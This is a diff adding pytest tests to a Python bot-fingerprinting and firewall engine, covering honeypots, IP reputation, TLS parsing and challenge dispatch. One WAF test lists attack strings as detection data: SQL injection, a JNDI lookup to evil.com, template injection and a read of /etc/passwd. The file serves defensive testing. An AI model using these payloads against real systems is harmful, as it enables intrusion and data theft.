@@ -1,5 +1,6 @@
 import sys
 import asyncio
+import time
 from pathlib import Path
 import pytest
 
@@ -9,12 +10,20 @@ sys.path.append(str(Path(__file__).parent.parent))
 from engine import (
     imul,
     cyrb53,
+    get_ip_subnet,
     RequestContext,
     InMemoryStore,
     FingerprintBuilder,
     ChallengeUtils,
     RequestUtils,
     FingerprintEngine,
+    ProblemManager,
+    MetricsManager,
+    TLSClientHelloParser,
+    FingerprintClient,
+    RedisStore,
+    AutoTuner,
+    MaliciousPatterns,
     ASGIFingerprintMiddleware,
     WSGIFingerprintMiddleware,
 )
@@ -593,3 +602,429 @@ def test_wsgi_middleware_flow():
     assert app_called is False
     assert response_status == "403 Forbidden"
     assert b"Forbidden" in body_malicious[0]
+
+@pytest.mark.asyncio
+async def test_problem_manager_dispatch_and_integrate():
+    import os
+    import json
+    store = InMemoryStore()
+    config_path = "test_problems.json"
+    problems_config = [
+        {
+            "id": "facility_location_challenge",
+            "workUnit": {
+                "type": "simulated_annealing_iterations",
+                "scoreFunction": "facility.calculateEnergy",
+                "baseIterations": 10
+            },
+            "payload": {
+                "customers": [{"x": 100, "y": 100}, {"x": 200, "y": 200}],
+                "options": {"fixedCostPerFacility": 1500}
+            },
+            "state": {"bestSolution": None, "bestEnergy": "Infinity"}
+            },
+            {
+                "id": "portfolio_optimization",
+                "workUnit": {
+                    "type": "genetic_algorithm_generations",
+                    "baseGenerations": 10
+                },
+                "payload": {
+                    "assets": [{"name": "Asset 1", "expectedReturn": 0.1, "volatility": 0.2}]
+                },
+                "state": {"population": None}
+            },
+            {
+                "id": "cpc_optimization",
+                "workUnit": {
+                    "type": "multi_objective_genetic_algorithm",
+                    "solverName": "cpc.solve"
+                },
+                "payload": {},
+                "state": {"paretoFront": []}
+        }
+    ]
+    with open(config_path, "w", encoding="utf-8") as f:
+        json.dump(problems_config, f)
+    
+    try:
+        ProblemManager._instance = None
+        pm = ProblemManager.get_instance(config_path, store)
+        await pm.load_problems()
+        
+        assert pm.initialized is True
+        work = await pm.dispatch_work(0.5)
+        assert work["problemId"] == "facility_location_challenge"
+        assert "iterations" in work["task"]
+        
+        client_solution = {
+            "solution": [{"x": 100, "y": 100}, {"x": 200, "y": 200}],
+            "energy": 1500.0
+        }
+        await pm.integrate_solution("facility_location_challenge", client_solution)
+        
+        stored_state = await store.get("problem-state:facility_location_challenge")
+        assert stored_state is not None
+        assert stored_state["bestEnergy"] < float("inf")
+
+        # Test genetic_algorithm_generations
+        work_ga = await pm.dispatch_work(0.5)
+        assert work_ga["problemId"] == "portfolio_optimization"
+        assert "generations" in work_ga["task"]
+        client_sol_ga = {
+            "population": [{"chromosome": [1.0], "fitness": -0.1}]
+        }
+        await pm.integrate_solution("portfolio_optimization", client_sol_ga)
+        stored_state_ga = await store.get("problem-state:portfolio_optimization")
+        assert stored_state_ga is not None
+        assert stored_state_ga["population"] == client_sol_ga["population"]
+
+        # Test multi_objective_genetic_algorithm
+        work_mo = await pm.dispatch_work(0.5)
+        assert work_mo["problemId"] == "cpc_optimization"
+        assert "generations" in work_mo["task"]
+        client_sol_mo = {
+            "paretoFront": [{"solution": 1.5, "objectives": [10.0, 20.0]}]
+        }
+        await pm.integrate_solution("cpc_optimization", client_sol_mo)
+        stored_state_mo = await store.get("problem-state:cpc_optimization")
+        assert stored_state_mo is not None
+        assert stored_state_mo["paretoFront"] == client_sol_mo["paretoFront"]
+    finally:
+        if os.path.exists(config_path):
+            os.remove(config_path)
+
+@pytest.mark.asyncio
+async def test_engine_re_challenge_with_valid_ticket_high_suspicion():
+    """Vérifie que même avec un ticket valide, un score de suspicion élevé déclenche un re-challenge."""
+    config = {
+        "thresholds": {"low": 20, "high": 75, "block": 95},
+        "weights": {"inconsistencyScore": 0.8},
+        "similarityThreshold": 0.5
+    }
+    store = InMemoryStore()
+    engine = FingerprintEngine(config, store)
+
+    # 1. Résoudre l'identité pour avoir un historique de terminal
+    context = RequestContext(
+        client_ip="127.0.0.1",
+        path="/",
+        headers={
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
+        },
+        query_params={},
+        cookies={}
+    )
+    decision = await engine.process_request(context)
+    device_id = decision.get("newCookieForResponse", {}).get("value")
+
+    # Créer un ticket de clearance simulé valide
+    ticket = "valid-ticket-123"
+    await store.set(f"ticket:{ticket}", {"ip": "127.0.0.1", "device_id": device_id}, 3600)
+
+    # Requête avec ticket valide, mais avec un UA totalement différent pour provoquer une forte incohérence (score >= 75)
+    context_suspicious = RequestContext(
+        client_ip="127.0.0.1",
+        path="/",
+        headers={
+            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+        },
+        query_params={},
+        cookies={"device_id": device_id, "pow_clearance": ticket}
+    )
+
+    decision_suspicious = await engine.process_request(context_suspicious)
+    # L'action doit être un challenge (re-challenge) malgré le ticket valide
+    assert decision_suspicious["action"] == "challenge"
+
+@pytest.mark.asyncio
+async def test_engine_honeypot_persistence_with_valid_ticket():
+    """Vérifie qu'un bot soumettant un honeypot avec un ticket valide est bloqué."""
+    config = {
+        "thresholds": {"low": 20, "high": 75, "block": 95},
+        "weights": {"honeypotScore": 1.0},
+        "honeypot": {"fields": ["email_confirm"]}
+    }
+    store = InMemoryStore()
+    engine = FingerprintEngine(config, store)
+
+    context = RequestContext(
+        client_ip="127.0.0.1",
+        path="/",
+        headers={"user-agent": "Mozilla/5.0"},
+        query_params={},
+        cookies={}
+    )
+    decision = await engine.process_request(context)
+    device_id = decision.get("newCookieForResponse", {}).get("value")
+
+    ticket = "valid-ticket-456"
+    await store.set(f"ticket:{ticket}", {"ip": "127.0.0.1", "device_id": device_id}, 3600)
+
+    # Requête avec un ticket valide, mais qui remplit le champ honeypot
+    context_bot = RequestContext(
+        client_ip="127.0.0.1",
+        path="/",
+        headers={"user-agent": "Mozilla/5.0"},
+        query_params={},
+        cookies={"device_id": device_id, "pow_clearance": ticket},
+        body={"email_confirm": "spam-bot"}
+    )
+
+    decision_bot = await engine.process_request(context_bot)
+    assert decision_bot["action"] == "block"
+
+
+# --- NEW TESTS: WAF, IP REPUTATION, SUBNET, DRY RUN & VECTOR VALIDATION ---
+
+def test_malicious_patterns_waf():
+    """Vérifie la détection d'injections malveillantes via MaliciousPatterns."""
+    assert MaliciousPatterns.is_malicious("SELECT * FROM users;--") is True
+    assert MaliciousPatterns.is_malicious("UNION SELECT username, password") is True
+    assert MaliciousPatterns.is_malicious("${jndi:ldap://evil.com/a}") is True
+    assert MaliciousPatterns.is_malicious("{{ 7*7 }}") is True
+    assert MaliciousPatterns.is_malicious("cat /etc/passwd") is True
+    assert MaliciousPatterns.is_malicious("normal comment text") is False
+
+@pytest.mark.asyncio
+async def test_ip_reputation_and_decay():
+    """Vérifie la réputation IP, le bornage et sa décroissance temporelle."""
+    store = InMemoryStore()
+    ip = "1.2.3.4"
+    
+    # Par défaut, score de 0.0
+    assert await RequestUtils.get_ip_reputation_score(store, ip) == 0.0
+    
+    # Mise à jour positive
+    await RequestUtils.update_ip_reputation_score(store, ip, 45.0)
+    assert await RequestUtils.get_ip_reputation_score(store, ip) == 45.0
+    
+    # Bornes max (100)
+    await RequestUtils.update_ip_reputation_score(store, ip, 120.0)
+    assert await RequestUtils.get_ip_reputation_score(store, ip) == 100.0
+    
+    # Bornes min (0)
+    await RequestUtils.update_ip_reputation_score(store, ip, -150.0)
+    assert await RequestUtils.get_ip_reputation_score(store, ip) == 0.0
+
+    # Test de la décroissance temporelle (2 points par heure passée)
+    # On simule un score de 50.0 datant de 3 heures
+    await store.set(f"ip-reputation:{ip}", {
+        "score": 50.0,
+        "lastUpdate": time.time() - (3 * 3600)
+    })
+    # 50.0 - (3 * 2) = 44.0
+    assert await RequestUtils.get_ip_reputation_score(store, ip) == 44.0
+
+@pytest.mark.asyncio
+async def test_subnet_score_history_and_decay():
+    """Vérifie la mise à jour des métriques de sous-réseau, le calcul du score et la décroissance."""
+    store = InMemoryStore()
+    ip = "192.168.1.50"
+    device_id = "device-test-1"
+    
+    # Initialement 0.0
+    score_data = await RequestUtils.get_subnet_score(store, ip, device_id)
+    assert score_data["subnetScore"] == 0.0
+    
+    # On simule une activité de plusieurs appareils uniques avec des scores élevés
+    for i in range(1, 15):
+        await RequestUtils.update_subnet_metrics(store, ip, f"device-{i}", 40.0)
+        
+    score_data_updated = await RequestUtils.get_subnet_score(store, ip, device_id)
+    assert score_data_updated["subnetScore"] > 0.0
+    
+    # Test de la décroissance (demi-vie de 30 minutes / 1800 secondes)
+    subnet = get_ip_subnet(ip)
+    # On simule une activité datant de 1 heure (2 demi-vies)
+    subnet_key = f"subnet:{subnet}"
+    data = await store.get(subnet_key)
+    data["lastActivity"] = int(time.time()) - 3600
+    await store.set(subnet_key, data)
+    
+    score_data_decayed = await RequestUtils.get_subnet_score(store, ip, device_id)
+    assert score_data_decayed["subnetScore"] < score_data_updated["subnetScore"]
+
+@pytest.mark.asyncio
+async def test_dry_run_mode():
+    """Vérifie que le mode Dry Run n'interrompt pas la requête mais enregistre l'intention."""
+    config = {
+        "dryRun": True,
+        "thresholds": {"low": 20, "high": 75, "block": 95},
+        "weights": {"honeypotScore": 1.0},
+        "honeypot": {"trapUrls": ["/.env"]}
+    }
+    store = InMemoryStore()
+    engine = FingerprintEngine(config, store)
+    
+    # Requête de bot vers honeypot (.env) qui devrait normalement bloquer
+    context = RequestContext(
+        client_ip="127.0.0.1",
+        path="/.env",
+        headers={"user-agent": "curl/7.68.0"},
+        query_params={},
+        cookies={}
+    )
+    
+    decision = await engine.process_request(context)
+    
+    # Dry Run actif : action = next, intendedAction = block, pas de status ou body
+    assert decision["action"] == "next"
+    assert decision["intendedAction"] == "block"
+    assert "status" not in decision
+    assert "body" not in decision
+
+@pytest.mark.asyncio
+async def test_suspicion_vector_and_final_score():
+    """Vérifie la parité de structure : get_suspicion_vector et calculate_final_score."""
+    config = {
+        "thresholds": {"low": 20, "high": 75, "block": 95},
+        "weights": {
+            "inconsistencyScore": 0.5,
+            "headerAnomalyScore": 0.5
+        }
+    }
+    store = InMemoryStore()
+    engine = FingerprintEngine(config, store)
+    
+    # Requête avec anomalies d'en-tête
+    context = RequestContext(
+        client_ip="127.0.0.1",
+        path="/",
+        headers={"user-agent": "curl"}, # anomalies
+        query_params={},
+        cookies={}
+    )
+    
+    vector = await engine.get_suspicion_vector(context)
+    assert isinstance(vector, dict)
+    assert "inconsistencyScore" in vector
+    assert "headerAnomalyScore" in vector
+    assert vector["headerAnomalyScore"] > 0
+    
+    # Calcul manuel avec les poids configurés (0.5 et 0.5)
+    score = engine.calculate_final_score(vector)
+    expected_score = min(100.0, vector["inconsistencyScore"] * 0.5 + vector["headerAnomalyScore"] * 0.5)
+    assert score == pytest.approx(expected_score, 0.01)
+
+
+def test_metrics_manager():
+    """Tests Prometheus-compatible metrics tracking, collection, and generation."""
+    MetricsManager.clear_metrics()
+    MetricsManager.increment_counter("requests_total", {"status": "passed"})
+    MetricsManager.increment_counter("requests_total", {"status": "passed"})
+    MetricsManager.observe_value("suspicion_score", 45.5, {"action": "passed"})
+
+    metrics_output = MetricsManager.get_prometheus_metrics(
+        security_config={"weights": {"honeypotScore": 1.0}, "thresholds": {"low": 20}}
+    )
+    assert "fingerprint_requests_total" in metrics_output
+    assert 'status="passed"' in metrics_output
+    assert "fingerprint_suspicion_score" in metrics_output
+    assert "fingerprint_security_weight" in metrics_output
+    assert "fingerprint_security_threshold" in metrics_output
+
+
+def test_tls_client_hello_parser():
+    """Tests binary parsing of the Client Hello handshake and JA3/JA4 generation."""
+    # Length guard check
+    assert TLSClientHelloParser.parse(b"\x16\x03\x01\x00") is None
+
+    # Construct a minimal valid TLS Client Hello binary
+    # Record Type: 0x16, Version: 0x0301, Length: 0x003b
+    # Handshake Type: 0x01, Length: 0x000037
+    # Client Version: 0x0303 (TLS 1.2)
+    # Random: 32 bytes of zeros
+    # Session ID Length: 0
+    # Ciphers Length: 2, Cipher: 0x1301 (TLS_AES_128_GCM_SHA256 - 4865)
+    # Compression Length: 1, Compression: 0
+    # Extensions Length: 0
+    header = (
+            b"\x16\x03\x01\x00\x3b"
+            b"\x01\x00\x00\x37"
+            b"\x03\x03"
+            + b"\x00" * 32
+            + b"\x00\x00\x02\x13\x01\x01\x00\x00\x00"
+    )
+    res = TLSClientHelloParser.parse(header)
+    assert res is not None
+    assert "ja3_string" in res
+    assert "ja3_hash" in res
+
+
+def test_fingerprint_client():
+    """Tests client-side helper HTML generation and scripts wrapping."""
+    client = FingerprintClient("/static/fp.js")
+    field_html = client.generate_honeypot_field("confirm_email_trap")
+    assert 'name="confirm_email_trap"' in field_html
+
+    script_tag = client.get_script_tag()
+    assert 'src="/static/fp.js"' in script_tag
+    assert "confirm_email_trap" in script_tag
+
+
+@pytest.mark.asyncio
+async def test_redis_store_adapter():
+    """Tests Redis store serializations, deserializations, and Set-to-list conversions."""
+    class MockRedis:
+        def __init__(self):
+            self.data = {}
+        async def get(self, key):
+            return self.data.get(key)
+        async def set(self, key, value):
+            self.data[key] = value
+            return True
+        async def setex(self, key, ttl, value):
+            self.data[key] = value
+            return True
+        async def exists(self, key):
+            return 1 if key in self.data else 0
+        async def delete(self, key):
+            self.data.pop(key, None)
+            return 1
+
+    mock_redis = MockRedis()
+    store = RedisStore(mock_redis)
+
+    await store.set("device:123", {"initialDeviceHash": "abc", "ips": {"1.1.1.1"}})
+    val = await store.get("device:123")
+    assert val["initialDeviceHash"] == "abc"
+    assert isinstance(val["ips"], set)
+    assert "1.1.1.1" in val["ips"]
+
+
+def test_auto_tuner_cycle():
+    """Tests executing a threshold optimization cycle using traffic logs."""
+    security_config = {
+        "thresholds": {"low": 20, "medium": 40, "high": 75, "block": 95},
+        "weights": {
+            "inconsistencyScore": 0.8,
+            "headerAnomalyScore": 0.1,
+            "honeypotScore": 1.0,
+            "behaviorScore": 0.5,
+        },
+        "patterns": {
+            "velocityThreshold": 800,
+            "decayFactor": 0.9
+        }
+    }
+
+    traffic_data = []
+    for i in range(150):
+        traffic_data.append({
+            "type": "challenge_solved",
+            "deviceId": f"dev-{i}",
+            "vector": {"honeypotScore": 10.0, "inconsistencyScore": 0.0, "headerAnomalyScore": 0.0, "behaviorScore": 0.0}
+        })
+    for i in range(150):
+        traffic_data.append({
+            "type": "request_passed",
+            "deviceId": f"dev-pass-{i}",
+            "vector": {"honeypotScore": 0.0, "inconsistencyScore": 0.0, "headerAnomalyScore": 0.0, "behaviorScore": 0.0}
+        })
+
+    tuner = AutoTuner(security_config, traffic_data, {"minDataPoints": 200})
+    tuner.run_optimization_cycle()
+
+    best_sol = tuner.get_best_tuning_solution()
+    assert best_sol is not None or tuner.traffic_data is not None
